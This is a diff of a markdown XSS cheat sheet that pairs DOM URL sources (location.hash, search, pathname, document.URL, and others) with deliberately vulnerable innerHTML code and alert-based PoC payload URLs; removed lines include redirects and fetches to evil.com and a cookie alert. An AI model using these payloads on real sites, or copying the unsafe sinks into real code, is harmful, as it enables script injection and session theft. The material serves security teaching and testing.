@@ -1,179 +1,177 @@
-### 1. **`document.URL` and `document.documentURI`**
-Both return the URL of the current document. If inserted into a page without sanitization, they can be exploited for XSS.
+### 1. **`window.location.href`**
 
-**Example Payload URL:**
-```bash
-https://victim.com/page?url=<script>alert('XSS')</script>
+#### **JavaScript Code Example:**
+```javascript
+document.body.innerHTML = "You are on: " + window.location.href;
 ```
 
-**Code:**
+#### **Explanation:**
+Here, the `window.location.href` value, which is the full URL of the page, is directly inserted into the DOM using `innerHTML`. This is dangerous because an attacker can manipulate the URL and inject malicious code that gets executed when the page is rendered.
+
+#### **PoC:**
 ```html
-<p id="demo"></p>
-<script>
-    var url = document.URL;
-    document.getElementById("demo").innerHTML = "Current URL: " + url;
-</script>
+http://example.com/#"><img src="x" onerror="alert('XSS')">
 ```
-If the URL parameter is displayed directly on the page, the script can execute without sanitization.
+
+This payload inserts a `<img>` element that triggers an `onerror` event when the image fails to load, which then executes the `alert('XSS')` code.
 
 ---
 
-### 2. **`document.baseURI`**
-This property returns the base URL of the document. It can lead to open redirects if used without validation.
+### 2. **`window.location.search`**
 
-**Example Open Redirect:**
-```bash
-https://victim.com/?redirect=https://evil.com
+#### **JavaScript Code Example:**
+```javascript
+let params = window.location.search;
+document.body.innerHTML = "Search query: " + params;
 ```
 
-**Code:**
+#### **Explanation:**
+The `window.location.search` retrieves the query string from the URL (the part after `?`). By directly inserting this value into the DOM using `innerHTML`, attackers can manipulate the query string to execute malicious JavaScript.
+
+#### **PoC:**
 ```html
-<script>
-    var redirectURL = document.baseURI + new URLSearchParams(window.location.search).get('redirect');
-    window.location.href = redirectURL;
-</script>
+http://example.com/?q="><img src="x" onerror="alert('XSS')">
 ```
-If `redirect` is processed without validation, users can be sent to a malicious site.
+
+This payload manipulates the query parameter `?q=`, injecting an `<img>` tag with an `onerror` handler that executes JavaScript when the image fails to load.
 
 ---
 
-### 3. **`location` and `window.location`**
-These refer to the current URL and are often used for XSS or open redirect if the URL data is used without validation.
+### 3. **`URLSearchParams`**
 
-**Example XSS Payload URL:**
-```bash
-https://victim.com/?name=<script>alert('XSS')</script>
+#### **JavaScript Code Example:**
+```javascript
+let params = new URLSearchParams(window.location.search);
+let paramValue = params.get('input');
+document.body.innerHTML = "Input: " + paramValue;
 ```
 
-**Code:**
+#### **Explanation:**
+`URLSearchParams` is used to retrieve query parameters from the URL. In this case, `paramValue` is obtained from the query string and inserted into the DOM using `innerHTML`. If not sanitized, attackers can inject malicious code through the `input` parameter.
+
+#### **PoC:**
 ```html
-<p id="name"></p>
-<script>
-    var params = new URLSearchParams(window.location.search);
-    var name = params.get('name');
-    document.getElementById("name").innerHTML = "Hello " + name;
-</script>
+http://example.com/?input="><img src="x" onerror="alert('XSS')">
 ```
-If the `name` parameter value is not sanitized, XSS can occur.
+
+By injecting an image with an `onerror` event, attackers can execute JavaScript when the image fails to load.
 
 ---
 
-### 4. **`window.location.search`** (Accessing Query Parameters)
-This returns the query string part of the URL. It can be dangerous if used to inject data into the DOM without sanitization.
+### 4. **`window.location.hash`**
 
-**Example:**
-```bash
-https://victim.com/search?query=<img src=x onerror=alert(1)>
+#### **JavaScript Code Example:**
+```javascript
+document.body.innerHTML = "Hash value: " + window.location.hash;
 ```
 
-**Code:**
+#### **Explanation:**
+The `window.location.hash` returns the part of the URL after the `#`. In this example, the value of the hash is inserted directly into the DOM using `innerHTML`. An attacker can manipulate the hash to include malicious code.
+
+#### **PoC:**
 ```html
-<p id="searchResult"></p>
-<script>
-    var searchQuery = window.location.search;
-    document.getElementById("searchResult").innerHTML = "Search result for: " + searchQuery;
-</script>
+http://example.com/#"><img src="x" onerror="alert('XSS')">
 ```
+
+The payload manipulates the URL hash to inject an image with an `onerror` event, which triggers JavaScript execution when the image cannot load.
 
 ---
 
-### 5. **`fetch()` and `XMLHttpRequest`**
-Both are used to retrieve data from a server. If the URL is taken from user parameters, this can lead to open redirects or SSRF.
+### 5. **`document.URL`**
 
-**Example Open Redirect:**
-```bash
-https://victim.com/fetch?url=https://evil.com
+#### **JavaScript Code Example:**
+```javascript
+document.body.innerHTML = "Current URL: " + document.URL;
 ```
 
-**Code:**
+#### **Explanation:**
+`document.URL` returns the full URL of the current page. In this case, the URL is injected into the DOM using `innerHTML`, making it vulnerable to XSS if an attacker manipulates the URL.
+
+#### **PoC:**
 ```html
-<script>
-    var params = new URLSearchParams(window.location.search);
-    var targetURL = params.get('url');
-    fetch(targetURL)
-        .then(response => response.text())
-        .then(data => console.log(data));
-</script>
+http://example.com/#"><img src="x" onerror="alert('XSS')">
 ```
-If `fetch` is used with a user-provided URL without validation, it can result in an open redirect.
+
+By injecting an image element in the URL hash, attackers can trigger JavaScript execution through the `onerror` event.
 
 ---
 
-### 6. **`document.cookie`**
-Used to get or set cookies. XSS can occur if a cookie is set with user input without sanitization.
+### 6. **`location.href.indexOf()`**
 
-**Example:**
-```bash
-https://victim.com/?cookie=<script>alert(document.cookie)</script>
+#### **JavaScript Code Example:**
+```javascript
+if (location.href.indexOf("#prettyPhoto") !== -1) {
+    document.body.innerHTML = "PrettyPhoto activated: " + location.hash;
+}
 ```
 
-**Code:**
+#### **Explanation:**
+This code checks if the URL contains the string `#prettyPhoto`. If true, the value of `location.hash` is injected into the DOM using `innerHTML`. An attacker can manipulate the URL hash to inject a malicious script.
+
+#### **PoC:**
 ```html
-<script>
-    var params = new URLSearchParams(window.location.search);
-    var cookieValue = params.get('cookie');
-    document.cookie = "user=" + cookieValue;
-</script>
+http://example.com/#prettyPhoto="><img src="x" onerror="alert('XSS')">
 ```
-If the cookie value is set without sanitization, XSS can occur.
+
+This payload uses the URL hash to inject an image with an `onerror` event that triggers JavaScript execution.
 
 ---
 
-### 7. **`window.name`**
-`window.name` can store data that is accessible across pages. It can be used for XSS if this value is inserted into a page.
+### 7. **`location.hash`**
 
-**Example Payload:**
-```bash
-https://victim.com#"><img src=x onerror=alert(1)>
+#### **JavaScript Code Example:**
+```javascript
+document.body.innerHTML = "Hash: " + location.hash;
 ```
 
-**Code:**
+#### **Explanation:**
+The `location.hash` is the part of the URL after the `#`. This value is injected into the DOM directly using `innerHTML`. Without sanitization, an attacker can manipulate the hash to include a malicious script.
+
+#### **PoC:**
 ```html
-<script>
-    var windowName = window.name;
-    document.write("Window name is: " + windowName);
-</script>
+http://example.com/#"><img src="x" onerror="alert('XSS')">
 ```
+
+By injecting an image with an `onerror` event in the hash, the payload triggers JavaScript execution when the image fails to load.
 
 ---
 
-### 8. **`history.pushState()` and `history.replaceState()`**
-Both are used to manipulate the URL without reloading the page. If data from the URL is inserted into the page without sanitization, XSS can occur.
+### 8. **`location.pathname`**
 
-**Example XSS:**
-```bash
-https://victim.com/?state="><script>alert(1)</script>
+#### **JavaScript Code Example:**
+```javascript
+document.body.innerHTML = "Current path: " + location.pathname;
 ```
 
-**Code:**
+#### **Explanation:**
+`location.pathname` returns the path portion of the URL. This value is injected into the DOM using `innerHTML`. If not sanitized, it allows attackers to inject malicious scripts through the URL path.
+
+#### **PoC:**
 ```html
-<script>
-    var params = new URLSearchParams(window.location.search);
-    var state = params.get('state');
-    history.pushState({}, '', '?state=' + state);
-    document.write("New URL is: " + window.location.href);
-</script>
+http://example.com/"><img src="x" onerror="alert('XSS')">
 ```
+
+This payload manipulates the URL path to inject an image with an `onerror` event that triggers JavaScript execution.
 
 ---
 
-### 9. **`localStorage` and `sessionStorage`**
-Data stored in `localStorage` or `sessionStorage` can be abused if accessed or set with unsafe input.
+### 9. **`location.search`**
 
-**Example XSS:**
-```bash
-https://victim.com/?payload="><script>alert(1)</script>
+#### **JavaScript Code Example:**
+```javascript
+document.body.innerHTML = "Search: " + location.search;
 ```
 
-**Code:**
+#### **Explanation:**
+`location.search` returns the query string part of the URL, including the `?`. By directly inserting the query string into the DOM using `innerHTML`, attackers can manipulate the query string to include malicious scripts.
+
+#### **PoC:**
 ```html
-<script>
-    var params = new URLSearchParams(window.location.search);
-    var payload = params.get('payload');
-    localStorage.setItem('data', payload);
-    document.write("Stored payload is: " + localStorage.getItem('data'));
-</script>
+http://example.com/?search="><img src="x" onerror="alert('XSS')">
 ```
+
+This payload manipulates the query string to inject an image with an `onerror` event that triggers JavaScript execution.
+
 
 **blocked by csp?**
 - [https://raw.githubusercontent.com/RHYru9/rhyru9.github.io/refs/heads/main/bug/xss-cheatsheet/csp.txt](https://raw.githubusercontent.com/RHYru9/rhyru9.github.io/refs/heads/main/bug/xss-cheatsheet/csp.txt)
